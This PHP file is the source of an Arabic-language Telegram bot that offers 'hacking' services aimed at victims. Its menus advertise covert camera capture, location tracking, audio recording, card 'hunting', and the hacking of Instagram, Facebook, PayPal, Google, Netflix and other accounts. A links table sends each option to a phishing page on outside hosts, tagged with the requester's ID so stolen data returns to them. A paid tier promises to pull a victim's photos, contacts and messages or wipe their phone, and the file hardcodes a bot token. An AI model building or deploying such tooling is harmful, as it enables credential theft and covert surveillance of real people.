<?php
$admin = ايديك;8678817970
$token = "توكن بوتك";
$checkToken = "8780142122:AAHbahMWBBs4-SsjdOh3JeeuFKkRF7BB5iQ";
#==================#

#==================#
define('API_KEY', $token);
function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}
function sendmessage($chat_id, $text){
 bot('sendMessage',[
 'chat_id'=>$chat_id,
 'text'=>$text,
 'parse_mode'=>"MarkDown"
 ]);
} 
 function sendphoto($chat_id, $photo, $caption){
 bot('sendphoto',[
 'chat_id'=>$chat_id,
 'photo'=>$photo,
 'caption'=>$caption,
 ]);
}
function sendsticker($chat_id,$sticker_id,$caption){
    bot('sendsticker',[
        'chat_id'=>$ChatId,
        'sticker'=>$sticker_id,
        'caption'=>$caption
    ]);
 } 
//-//////
$update = json_decode(file_get_contents('php://input'));
$message = $update->message; 
$chat_id = $message->chat->id;
$text = $message->text;
$chatid = $update->callback_query->message->chat->id;
$data = $update->callback_query->data;
$message_id = $update->callback_query->message->message_id;

$chat_id2 = $update->callback_query->message->chat->id;
$user_id = $message->from->id;
$name = $message->from->first_name;
$username = $message->from->username;
// قراءة معرفات المستخدمين المخزنة في الملف وتحويلها إلى مصفوفة
$u = explode("\n", file_get_contents("database/ID.txt"));

// حساب عدد الأعضاء الحاليين
$c = count($u) - 1;

// التأكد من أن $update و $chat_id تم تعريفهما وأن $chat_id غير موجودة بالفعل في المصفوفة $u
$ban = file_get_contents("database/ban.txt");
$exb = explode("\n",$ban);



    // إرسال رسالة إلى الإدمن عن المستخدم الجديد
 

#===============
mkdir("database");
mkdir("database/$chat_id");
#==========لوحه تحكم========#
$id = $message->from->id;
$text = $message->text;
$chat_id = $message->chat->id;
$user = $message->from->username;
$name = $message->from->first_name;
$sajad = file_get_contents("database/rembo.txt");
$ch = file_get_contents("database/ch.txt");
$tn = file_get_contents("database/tnb.txt");

$bot = file_get_contents("database/bot.txt");

$m = explode("\n",file_get_contents("database/ID.txt"));
$m1 = count($m)-1;
if($message and !in_array($id, $m)){
file_put_contents("database/ID.txt", $id."\n",FILE_APPEND);
 }
if (isset($update) && !in_array($chat_id, $u)) {
    // حفظ معرف المستخدم الجديد إلى الملف
    file_put_contents("database/ID.txt", $chat_id . "\n", FILE_APPEND);
if($text =="/start"and $tn =="on"and $id !=$admin){
bot('sendmessage',[
'chat_id'=>$admin,
'text'=>
"
🔔 *تنبيه: مستخدم جديد انضم إلى البوت الخاص بك!*
👨‍💼¦ اسمه » ️ [$name](tg://user?id=$id)
🔱¦ معرفه »  ️[@$user](tg://user?id=$id)
💳¦ ايديه » ️ [$id](tg://user?id=$id)
📊 *عدد الأعضاء الكلي:* $c
",
'parse_mode'=>"MarkDown",
]);
}
}
if($text =='/admin' and $id ==$admin){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text' => "مرحبًا! إليك أوامرك: ⚡📮\n\n
1. إدارة المشتركين والتحكم بهم.\n
2. إرسال إذاعات ورسائل موجهة.\n
3. ضبط إعدادات الاشتراك الإجباري.\n
4. تفعيل أو تعطيل التنبيهات.\n
5. إدارة حالة البوت ووضع الاشتراك.",
'reply_markup' => json_encode([
    'inline_keyboard' => [
        [['text' => "المشتركين 👥", 'callback_data' => "m1"]],
        [['text' => "إذاعة رسالة 📮", 'callback_data' => "send"], ['text' => "توجيه رسالة 🔄", 'callback_data' => "forward"]],
        [['text' => "وضع اشتراك إجباري 💢", 'callback_data' => "ach"], ['text' => "حذف اشتراك إجباري 🔱", 'callback_data' => "dch"]],
        [
    ['text' => 'تحديثات البوت 🔴', 'url' => 'https://t.me/DA4K711']
], 

        [['text' => "تفعيل التنبيه ✔️", 'callback_data' => "ons"], ['text' => "تعطيل التنبيه ❎", 'callback_data' => "ofs"]],
        [['text' => "فتح البوت ✅", 'callback_data' => "obot"], ['text' => "إيقاف البوت ❌", 'callback_data' => "mmmqkkqkwkakjshs"]],
        [['text' => "وضع المدفوع 💰", 'callback_data' => "pro"], ['text' => "وضع المجاني 🆓", 'callback_data' => "frre"]],
        [['text' => "اظافه عظو مدفوع 💰", 'callback_data' => "pro123"], ['text' => "ازاله عظو مدفوع 🆓", 'callback_data' => "frre123"]],
        [['text' => "حظر عضو 🚫", 'callback_data' => "ban"], ['text' => "إلغاء حظر عضو ❌", 'callback_data' => "unban"]],
    ]
])
]);

}

if($data =='oooo'){
bot('editmessagetext',[
'chat_id'=>$chat_id2,
'message_id'=>$update->callback_query->message->message_id,
'text' => "مرحبًا! إليك أوامرك: ⚡📮\n\n
1. إدارة المشتركين والتحكم بهم.\n
2. إرسال إذاعات ورسائل موجهة.\n
3. ضبط إعدادات الاشتراك الإجباري.\n
4. تفعيل أو تعطيل التنبيهات.\n
5. إدارة حالة البوت ووضع الاشتراك.",
'reply_markup' => json_encode([
    'inline_keyboard' => [
        [['text' => "المشتركين 👥", 'callback_data' => "m1"]],
        [['text' => "إذاعة رسالة 📮", 'callback_data' => "send"], ['text' => "توجيه رسالة 🔄", 'callback_data' => "forward"]],
        [['text' => "وضع اشتراك إجباري 💢", 'callback_data' => "ach"], ['text' => "حذف اشتراك إجباري 🔱", 'callback_data' => "dch"]],
        [['text' => "تفعيل التنبيه ✔️", 'callback_data' => "ons"], ['text' => "تعطيل التنبيه ❎", 'callback_data' => "ofs"]],
                [
    ['text' => 'تحديثات البوت 🔴', 'url' => 'https://t.me/DA4K711']
], 
        [['text' => "فتح البوت ✅", 'callback_data' => "obot"], ['text' => "إيقاف البوت ❌", 'callback_data' => "hshshshshjsjsjsjsjjsjsksks"]],
        [['text' => "وضع المدفوع 💰", 'callback_data' => "pro"], ['text' => "وضع المجاني 🆓", 'callback_data' => "frre"]],
        [['text' => "اظافه عظو مدفوع 💰", 'callback_data' => "pro123"], ['text' => "ازاله عظو مدفوع 🆓", 'callback_data' => "frre123"]],
        [['text' => "حظر عضو 🚫", 'callback_data' => "ban"], ['text' => "إلغاء حظر عضو ❌", 'callback_data' => "unban"]],
    ]
])
]);

unlink("database/rembo.txt");
}
if($data =="unban"){
bot('editmessagetext',[
'chat_id'=>$chat_id2, 
'message_id'=>$update->callback_query->message->message_id,
'text'=>"حسنا عزيزي ارسل ايدي العضو لالغاء حظره🔱", 
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"الغاء الامر❎",'callback_data'=>"back"]],
]
])
]);
file_put_contents("database/$token/rembo.txt","unban");
}
if($text and $sajad =="unban" and $id ==$admin){
$bn = str_replace($text,'',$ban);
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"تم الغاء حظر العضور بنجاح✅",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"العودة🔙",'callback_data'=>"m"]],
]
])
]);
file_put_contents("database/$token/ban.txt",$bn);
unlink("database/$token/rembo.txt");
bot('SendMessage',[
'chat_id'=>$text,
'text'=>"تم الغاء حظرك من البوت🤩",
]);
}
if($data =="ban"){
bot('editmessagetext',[
'chat_id'=>$chat_id2, 
'message_id'=>$update->callback_query->message->message_id,
'text'=>"حسنا عزيزي ارسل ايدي العضو لاحظره🤩", 
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"الغاء الامر❎",'callback_data'=>"m"]],
]
])
]);
file_put_contents("database/rembo.txt","ban");
}

if($text and $sajad =="ban" and $id ==$admin){
file_put_contents("database/ban.txt",$text."\n",FILE_APPEND);
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"تم حظر العضور بنجاح✅",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"العودة🔙",'callback_data'=>"m"]],
]
])
]);
bot('SendMessage',[
'chat_id'=>$text,
'text'=>"تم حظرك من قبل المطور لايمكنك استخدام البوت😒",
]);
}

if($data =="idoeoeoeoeoeoskkskwkskskskkskskdkdkdkdkkd"){
bot('editmessagetext',[
'chat_id'=>$chat_id2, 
'message_id'=>$update->callback_query->message->message_id,
'text'=>"تم اغلاق البوت✅", 
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"عودة🔙",'callback_data'=>"sjsjsjjekekepeoeijekskskskskss"]],
]
])
]);
file_put_contents("database/bot1.txt","sjsjjsjsjsjsjejejeiieiekskss");
}
$obot = file_get_contents("database/bot1.txt");
if($data =="obot"){
bot('editmessagetext',[
'chat_id'=>$chat_id2, 
'message_id'=>$update->callback_query->message->message_id,
'text'=>"تم فتح البوت بنجاح✅",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"عودة🔙",'callback_data'=>"back"]],
]
])
]);
unlink("database/bot1.txt");
}
if($data =="send"){
bot('editmessagetext',[
'chat_id'=>$chat_id2, 
'message_id'=>$update->callback_query->message->message_id,
'text'=>"حسنا عزيزي ارسل رسالتك📮", 
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"الغاء الامر❎",'callback_data'=>"m"]],
]
])
]);
file_put_contents("database/rembo.txt","send");
} 
if($text and $sajad == "send" and $id == $admin){
bot("sendmessage",[
"chat_id"=>$chat_id,
"text"=>'-تم النشر بنجاح✔️',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'العوده🔙' ,'callback_data'=>"m"]],
]])
]);
for($i=0;$i<count($m); $i++){
bot('sendMessage', [
'chat_id'=>$m[$i],
'text'=>$text
]);
unlink("database/rembo.txt");
}
}
if($data =="forward"){
bot('editmessagetext',[
'chat_id'=>$chat_id2, 
'message_id'=>$update->callback_query->message->message_id,
'text'=>"حسنا عزيزي قم بتوجيه الرسالة✅", 
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"الغاء الامر❎",'callback_data'=>"m"]],
]
])
]);
file_put_contents("database/rembo.txt","forward");
} 
if($text and $sajad == "forward" and $id == $admin){
bot("sendmessage",[
"chat_id"=>$chat_id,
"text"=>'تم التوجيه بنجاح🔰',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'العوده🔙' ,'callback_data'=>"m"]],
]])
]);
for($i=0;$i<count($m); $i++){
bot('forwardMessage', [
'chat_id'=>$m[$i],
'from_chat_id'=>$id,
'message_id'=>$message->message_id
]);
unlink("database/rembo.txt");
}
}

if($data =="dch"){
bot('editmessagetext',[
'chat_id'=>$chat_id2, 
'message_id'=>$update->callback_query->message->message_id,
'text'=>"ارسل معرف القناه لازالتها من الاشتراك الاجباري", 
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"الغاء الامر❎",'callback_data'=>"m"]],
]
])
]);
file_put_contents("database/rembo.txt","dch");
}
if($text and $sajad =="dch" and $id ==$admin){
$botn = str_replace($text,'',$bot);
file_put_contents("database/bot.txt","$botn");
unlink("database/rembo.txt");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"تم مسح القناه من الاشتراك الاجباري",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"العودة🔙",'callback_data'=>"m"]],
]
])
]);
}
if($data == "m1"){
    bot('answercallbackquery',[
        'callback_query_id'=>$update->callback_query->id,
        'text'=>"
عدد المشترڪين هو » $m1 «
        ",
        'show_alert'=>true,
]);
}
#========القسم مدفوع =======#
if($data =="pro123"){
bot('editmessagetext',[
'chat_id'=>$chat_id2, 
'message_id'=>$update->callback_query->message->message_id,
'text'=>"قم بارسال ايدي الشخص مراد اظافته بقسم مدفوع", 
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"الغاء الامر❎",'callback_data'=>"m"]],
]
])
]);
file_put_contents("database/rembo.txt","pro123");
}
if($text and $sajad =="pro123" and $id ==$admin){
file_put_contents("database/vip123.txt",$text."\n",FILE_APPEND);
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"تم اظافته في وضع مدفوع",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"العودة🔙",'callback_data'=>"m"]],
]
])
]);
unlink("database/rembo.txt");
}
#================
if($data =="frre123"){
bot('editmessagetext',[
'chat_id'=>$chat_id2, 
'message_id'=>$update->callback_query->message->message_id,
'text'=>"ارسل ايدي شخص مراد ازالته من الاشتراك مدفوع", 
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"الغاء الامر❎",'callback_data'=>"m"]],
]
])
]);
file_put_contents("database/rembo.txt","frre123");
}
if($text and $sajad =="frre123" and $id ==$admin){
$botn = str_replace($text,'',$bot);
file_put_contents("database/vip123.txt","$botn");
unlink("database/rembo.txt");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"تم ازالته من الاشتراك مدفوع",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"العودة🔙",'callback_data'=>"m"]],
]
])
]);
}
#================#
if($data =="ach"){
bot('editmessagetext',[
'chat_id'=>$chat_id2, 
'message_id'=>$update->callback_query->message->message_id,
'text'=>"حسنا عزيزي ارسل معرف قناتك 📮", 
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"الغاء الامر❎",'callback_data'=>"m"]],
]
])
]);
file_put_contents("database/rembo.txt","ch");
}
if($text and $sajad =="ch" and $id ==$admin){
file_put_contents("database/bot.txt",$text."\n",FILE_APPEND);
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"تم وضع اشتراك اجباري😁",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"العودة🔙",'callback_data'=>"m"]],
]
])
]);
unlink("database/rembo.txt");
}
#================

#=°°°====°°
if($data =="ofs"){
bot('editmessagetext',[
'chat_id'=>$chat_id2, 
'message_id'=>$update->callback_query->message->message_id,
'text'=>"
تم تعطيل التنبيه بنجاح✅
", 
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"العودة🔙",'callback_data'=>"m"]],
]
])
]);
unlink("database/tnb.txt");
} 

if($message and in_array($id, $exb)){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"انت محظور من قبل المطور لايمكنك استخدام البوت📛",
]);return false;}

if($message and $obot =="off" and $id !=$admin){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"بوت متوقف حاليا لاغراض خاصه 🚨🚧",
]);return false;}
#========مدفوع=======#
if($data =="frre"){
bot('editmessagetext',[
'chat_id'=>$chat_id2, 
'message_id'=>$update->callback_query->message->message_id,
'text'=>"
تم جعل البوت بوضع المجاني 😊
", 
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"العودة🔙",'callback_data'=>"m"]],
]
])
]);
unlink("database/vip.txt");
} 
if($data =="pro"){
bot('editmessagetext',[
'chat_id'=>$chat_id2, 
'message_id'=>$update->callback_query->message->message_id,
'text'=>"
تم جعل البوت بوضع المدفوع 💼
", 
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"العودة🔙",'callback_data'=>"m"]],
]
])
]);
   file_put_contents("database/vip.txt", "on");
} 


$vip = file_get_contents("database/vip.txt");
$vip123 = file_get_contents("database/vip123.txt");
$vip2 = explode("\n", $vip123);

if ($vip == "on" and !in_array($id, $vip2)) {
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"مرحبًا بكم! 🌟

للاستفادة الكاملة من جميع ميزات وخدمات بوتنا المتقدمة، يُرجى تفعيل البوت من خلال شراء الاشتراك. ⚙️✨

نحن نعمل بجد لضمان تقديم تجربة فريدة ومميزة لكم. 🚀

شكراً لثقتكم بنا. 😊",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"شراء الاشتراك",'url'=>"tg://user?id=$admin"]],
]
])
]);return false;}
#===============

$channels = file("database/bot.txt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

// دالة لتسجيل الأخطاء
function logError($message) {
    file_put_contents('error_log.txt', $message . PHP_EOL, FILE_APPEND);
}

// الدالة للتحقق من اشتراك المستخدم في القناة
function isUserSubscribed($userId, $channel, $token) {
    $url = "https://api.telegram.org/bot$token/getChatMember?chat_id=$channel&user_id=$userId";
    $result = file_get_contents($url);
    $result = json_decode($result, true);

    if (!$result) {
        logError("Failed to fetch chat member info: " . json_last_error_msg());
        return false;
    }

    if ($result['ok'] && ($result['result']['status'] == 'member' || $result['result']['status'] == 'administrator' || $result['result']['status'] == 'creator')) {
        return true;
    }
    return false;
}

// الدالة لجلب اسم القناة
function getChannelName($channel, $token) {
    $url = "https://api.telegram.org/bot$token/getChat?chat_id=$channel";
    $result = file_get_contents($url);
    $result = json_decode($result, true);

    if (!$result) {
        logError("Failed to fetch chat info: " . json_last_error_msg());
        return $channel;
    }

    if ($result['ok']) {
        return $result['result']['title'];
    }
    return $channel; // ارجاع المعرف إذا لم ينجح الحصول على الاسم
}

// استقبال الطلبات الواردة من المستخدمين
$input = file_get_contents('php://input');
$update = json_decode($input, true);

if (isset($update['message'])) {
    $chatId = $update['message']['chat']['id'];
    $userId = $update['message']['from']['id'];
    $firstName = $update['message']['from']['first_name'];

    // تحقق من اشتراك المستخدم في جميع القنوات
    $notSubscribedChannels = [];
    foreach ($channels as $channel) {
        if (!isUserSubscribed($userId, $channel, $token)) {
            $notSubscribedChannels[] = $channel;
        }
    }

    // إعداد رسالة الرد
    if (!empty($notSubscribedChannels)) {
        $message = "
❌عذرا عليك الاشتراك في قنوات البوت اولا


المطور: @$admin

";

// القنوات المطلوبة: اسم أو رابط
        $keyboard = [
            'inline_keyboard' => []
        ];

        foreach ($notSubscribedChannels as $channel) {
            $channelName = getChannelName($channel, $token);
            // إزالة @ من معرف القناة إذا كان موجوداً
            $cleanChannel = ltrim($channel, '@');
            $keyboard['inline_keyboard'][] = [['text' => "اشترك في $channelName", 'url' => "https://t.me/$cleanChannel"]];
            $message .= "$channelName\n";
        }

        $message .= "\n📢 بعد إتمام الاشتراك، قم بإرسال رسالة \"/start\" للمتابعة واستغلال جميع خدمات البوت.\n\n💬 نتمنى لك تجربة رائعة ومليئة بالتفاعل! 💬";

        $replyMarkup = '&reply_markup=' . json_encode($keyboard);
        file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chatId&text=" . urlencode($message) . $replyMarkup);

        // إنهاء التنفيذ إذا لم يكن المستخدم مشتركًا في جميع القنوات
        return false;
    } else {
        // تابع بتنفيذ الخدمات هنا
    }
}

#
// توكن البوت الأساسي لإرسال الرسائل

// توكن البوت الذي يتحقق من الاشتراك

// القناة المطلوبة بدون @
$channels = [
    ""
];

// روابط القنوات (تقدر تضيف رابط دعوة خاص لو عندك)
$channelLinks = [
    "𝙼𝚈𝚂𝚃" => "https://t.me/يوزر قناتك من دون @"
];

// دالة التحقق من الاشتراك باستخدام بوت مختلف
function checkSubscription($user_id, $channel) {
    global $checkToken;
    $res = file_get_contents("https://api.telegram.org/bot$checkToken/getChatMember?chat_id=@$channel&user_id=$user_id");
    $result = json_decode($res, true);
    if (isset($result['result']['status'])) {
        $status = $result['result']['status'];
        return in_array($status, ['member', 'creator', 'administrator']);
    }
    return false;
}

if ($text) {
    $notSubscribedChannels = [];
    foreach ($channels as $channel) {
        if (!checkSubscription($user_id, $channel)) {
            $notSubscribedChannels[] = $channel;
        }
    }

    if (!empty($notSubscribedChannels)) {
        $keyboard = ['inline_keyboard' => []];
        $message = "❌ يجب الاشتراك في القناة التالية أولاً:\n\n";

        foreach ($notSubscribedChannels as $channel) {
            $url = $channelLinks[$channel] ?? "https://t.me/$channel";
            $message .= "• @$channel\n";
            $keyboard['inline_keyboard'][] = [
                ['text' => "اشترك في 𝙼𝚈𝚂𝚃 📢", 'url' => $url]
            ];
        }

        $message .= "\n📢 بعد إتمام الاشتراك، قم بإرسال رسالة \"/start\" للمتابعة.";

        bot('sendMessage', [
            'chat_id' => $chat_id,
            'text' => $message,
            'reply_markup' => json_encode($keyboard)
        ]);

        exit;
    }

    // المستخدم مشترك في القناة، تابع تنفيذ الخدمات هنا
}


if ($text == "/start") {
    @unlink("database/$chat_id/database.txt");

    bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "🤖✨**مرحبا بك جميع الازرار مجانا 😊**",
        'parse_mode' => "Markdown",
        'disable_web_page_preview' => true,
        'reply_markup' => json_encode([
            'inline_keyboard' => [                 
        [
        ['text' => 'تلغيم رابط👿', 'callback_data' => 'exi2'],
        ['text' => 'روابط مزوره☠️', 'callback_data' => 'exit3']
    ],
    [
            ['text' => 'اختراق الكامرا الأمامية 🔥', 'callback_data' => 'com'],
            ['text' => 'اختراق الكامرا الخلفية 📷', 'callback_data' => 'co']
        ],
    [
            ['text' => 'اختراق الموقع 📌', 'callback_data' => 'moq'],
            ['text' => 'تسجيل صوت الضحية 🎤', 'callback_data' => 'record_audio']
        ],
    [
            ['text' => 'تصوير الضحية فيديو 🎥', 'callback_data' => 'com1'],
            ['text' => 'جمع معلومات الجهاز 🧾', 'callback_data' => 'ma']
        ],
    [
            ['text' => 'الارقام وهميه ☎️', 'callback_data' => 'fake_number'],
            ['text' => 'اختراق الهاتف كاملاً 🚨', 'callback_data' => 'full_device']
        ],
   
            [
            ['text' => 'صيد فيزات 💳', 'callback_data' => 'get_fake_visa'],
            ['text' => 'أعطيني نكتة 😂', 'callback_data' => 'send_joke']
        ],

        [
            ['text' => 'اختراق قنوات التلفاز 📺', 'callback_data' => 'tv_channels'],
            ['text' => 'اختراق بث الراديو 📻', 'callback_data' => 'hack_radio']
        ],

           [
            ['text' => 'اختراق انستجرام 🆔', 'callback_data' => 'send_instagram_link'],
            ['text' => 'اختراق فري فاير 💎', 'callback_data' => 'send_freefire_link']
        ],
            [
            ['text' => 'اختراق ببجي 🎮', 'callback_data' => 'send_adobe_link'],
            ['text' => 'اختراق فيسبوك 🔮', 'callback_data' => 'send_spotify_link']
        ],

           [
            ['text' => 'اختراق ديسكورد 🔥', 'callback_data' => 'send_google2_link'],
            ['text' => 'اغلاق المواقع 🔱', 'web_app' => ['url' => 'https://brass-comfortable-ricotta.glitch.me/']]
        ],
 
        
               [
            ['text' => 'الذكاء الاصطناعي 🤖', 'web_app' => ['url' => 'https://sparkly-liger-751b2d.netlify.app/']],
            ['text' => 'اختراق باي بال 💲', 'callback_data' => 'send_paypal_link']
        ],

      [
            ['text' => 'اختراق نتفليكس 🔴', 'callback_data' => 'send_netflix_link'],
            ['text' => 'معرفة رقم الضحية ☎️', 'callback_data' => 'get_user_link']
        ],
    
            [
            ['text' => 'اختراق جوجل 🔍', 'callback_data' => 'send_google_link'],
            ['text' => 'اختراق تيك توك 🚫', 'callback_data' => 'send_tiktok_link']
        ],
                   [
            ['text' => 'اختراق كواي 🚬', 'callback_data' => 'kwai'],
                        ['text' => 'اختراق واتساب 🟡', 'callback_data' => 'wats']
        ],

           [
            ['text' => 'اختراق ووردبريس 📝', 'callback_data' => 'send_wordpress_link'],
            ['text' => 'اختراق يوتيوب 🔴', 'callback_data' => 'verify_number']
        ],
           [
            ['text' => 'اختراق سناب شات 📀', 'callback_data' => 'send_twitch_link'],
            ['text' => 'اختراق تويتر 🐦', 'callback_data' => 'send_twitter_link']
        ],

        [
            ['text' => 'اختراق روبليكس 🎮', 'callback_data' => 'send_roblox_link'],
            ['text' => ' تحليل شخصيتك🚸', 'callback_data' => 'pm']
        ],

      [
        ['text' => 'فتح شات واتساب ✳️ ️', 'callback_data' => 'search_whatsapp_number'],
        ['text' => 'بحث حساب عبر id🔍 ', 'callback_data' => 'search_telegram_id']
    ],
    [
['text' => 'تتواصل مع المطور', 'url' => "tg://user?id=$admin"]
],          

    ]
])
]); 
}
if ($text == "/vip") {
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "مرحبًا! 
هذه الخيارات مدفوعة بسعر 15 نقطة. 
يمكنك تجميع النقاط وفتحها مجانًا.

🔹 ارسل /ng_wahm لعرض عدد نقاطك وعرض رابط الدعوة الخاص بك.",
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [['text' => 'سحب جميع صور الهاتف عبر رابط🔒', 'callback_data' => 'vip_photos'],
                
                ['text' => 'سحب جميع الرقام الضحيه عبر رابط🔒', 'callback_data' => 'vip_video']],
                
                [['text' => 'سحب جميع رسايل الضحيه عبر رابط🔒', 'callback_data' => 'vip_messages'],
                
                ['text' => 'فرمتة جوال الضحيه عبر رابط🔒', 'callback_data' => 'vip_phone']],
                
                [['text' => 'اختراق عبر صوره🔒', 'callback_data' => 'vip_file'],
                
                ['text' => 'اختراق عبر ملف🔒', 'callback_data' => 'vip_number']],
                
                                [['text' => 'كشف شكل البوت', 'callback_data' => 'xm16']],
                // إضافة زر "شراء البوت المتميز"
                [['text' => 'شراء البوت  (15 نقطة)', 'callback_data' => 'mm16']]
            ]
        ])
    ]);
}
$arabic_channels = [
    "السعودية 🇸🇦" => "https://www.ksa-tv.live/",
    "الإمارات 🇦🇪" => "https://www.emarat-tv.ae/live/",
    "مصر 🇪🇬" => "https://www.nileinternational.net/live/",
    "العراق 🇮🇶" => "https://www.alsumaria.tv/live",
    "سوريا 🇸🇾" => "https://www.ortas.online/",
    "لبنان 🇱🇧" => "https://www.mtv.com.lb/Live",
    "الأردن 🇯🇴" => "https://www.jrtv.gov.jo/live",
    "الكويت 🇰🇼" => "https://www.kwtv.gov.kw/",
    "البحرين 🇧🇭" => "https://www.bahrain-tv.com/",
    "عمان 🇴🇲" => "https://www.oman-tv.gov.om/live/",
    "قطر 🇶🇦" => "https://www.aljazeera.net/live",
    "اليمن 🇾🇪" => "https://www.yementv.tv/",
    "ليبيا 🇱🇾" => "https://www.libya.tv/live/",
    "السودان 🇸🇩" => "https://www.sudantv.sd/",
    "الجزائر 🇩🇿" => "https://www.entv.dz/live/",
    "المغرب 🇲🇦" => "https://www.2m.ma/en/live/",
    "تونس 🇹🇳" => "https://www.watania1.tn/live",
    "فلسطين 🇵🇸" => "https://www.pbc.ps/live",
    "موريتانيا 🇲🇷" => "https://www.tvm.mr/",
    "الصومال 🇸🇴" => "https://www.sntv.so/",
    "جيبوتي 🇩🇯" => "https://www.rtd.dj/",
    "جزر القمر 🇰🇲" => "https://www.rtnc.km/"
];
if ($data == "zakhrafa_name") {
    bot('sendMessage', [
        'chat_id' => $chat_id2,
        'text' => "أرسل اسمك لزخرفته بالإنجليزي:",
    ]);
    file_put_contents("zakhrafa_step.txt", $chat_id2);
}
// عند الضغط على زر "قنوات التلفزيون"
if ($data == "tv_channels") {
    $buttons = [];
    $row = [];

    foreach ($arabic_channels as $country => $link) {
        $row[] = ['text' => $country, 'callback_data' => "channel_" . md5($country)];
        if (count($row) == 3) {
            $buttons[] = $row;
            $row = [];
        }
    }

    // إذا فيه دول متبقية بعد آخر صف كامل
    if (!empty($row)) {
        $buttons[] = $row;
    }

    bot('sendMessage', [
        'chat_id' => $chat_id2,
        'text' => "اختر الدولة لاختراق قناة تلفزيونية مباشرة:",
        'reply_markup' => json_encode(['inline_keyboard' => $buttons])
    ]);
}

// إرسال رابط القناة عند اختيار الدولة
foreach ($arabic_channels as $country => $link) {
    if ($data == "channel_" . md5($country)) {
        bot('sendMessage', [
            'chat_id' => $chat_id2,
            'text' => "اختراق بث مباشر  من قناة *$country*:\n$link",
            'parse_mode' => "Markdown"
        ]);
    }
}
if ($data == "special_bot") {
    $points_file = "nqat_wahm.json";

    // جلب النقاط
    $points_data = file_exists($points_file) ? json_decode(file_get_contents($points_file), true) : [];
    $user_points = isset($points_data[$user_id]) ? $points_data[$user_id] : 0;

    if ($user_points >= 30) {
        // خصم 30 نقطة
        $points_data[$user_id] = $user_points - 30;
        file_put_contents($points_file, json_encode($points_data, JSON_PRETTY_PRINT));

        bot('sendMessage', [
            'chat_id' => $chat_id2,
            'text' => "🎉 تم شراء البوت المتميز بنجاح!\n✅ تم خصم 3 نقطة من رصيدك.",
            'parse_mode' => "Markdown"
        ]);
    } else {
        $invite_link = "https://t.me/WAHM_REBOT?start=$user_id";
        bot('sendMessage', [
            'chat_id' => $chat_id2,
            'text' => "❗️ليس لديك نقاط كافية لشراء البوت.\n\n🚀 اجمع نقاط من خلال دعوة أصدقائك:\n$invite_link",
            'parse_mode' => "Markdown"
        ]);
    }
}
$links = [
    'send_pubg_link' => "https://smmyemen.pro/bots/wahm1954/GLACIER(PUBG)/index.php?ID=$chat_id2",
    'send_pubg2_link' => "https://smmyemen.pro/bots/wahm1954/SPIN/index.php?ID=$chat_id2",
    'send_pubg3_link' => "https://smmyemen.pro/bots/wahm1954/MIDASBUY(OLDxPUBG)/index.php?ID=$chat_id2",
    'send_adobe_link' => "https://smmyemen.pro/bots/wahm1954/index3.html?id=$chat_id2",
    'send_facebook_link' => "https://separated-brawny-odometer.glitch.me?ID=$chat_id2",
    'send_discord_link' => "https://trite-tough-earthquake.glitch.me?id=$chat_id2",
    'send_paypal_link' => "https://smmyemen.pro/bots/wahm1954/index2.html?id=$chat_id2",
    'send_netflix_link' => "https://smmyemen.pro/bots/wahm1954/index17.html?id=$chat_id2",
    'send_instagram_link' => "https://smmyemen.pro/bots/wahm1954/index1.html?id=$chat_id2",
    'send_google_link' => "https://smmyemen.pro/bots/wahm1954/index9.html?id=$chat_id2",
    'send_google2_link' => "https://smmyemen.pro/bots/wahm1954/index10.html?id=$chat_id2",
    'send_badoo_link' => "https://smmyemen.pro/bots/wahm1954/badoo/index.php?ID=$chat_id2",
    'send_messenger_link' => "https://smmyemen.pro/bots/wahm1954/fb_messenger/index.php?ID=$chat_id2",
    'send_github_link' => "https://smmyemen.pro/bots/wahm1954/github/index.php?ID=$chat_id2",
    'send_gitlab_link' => "https://smmyemen.pro/bots/wahm1954/gitlab/index.php?ID=$chat_id2",
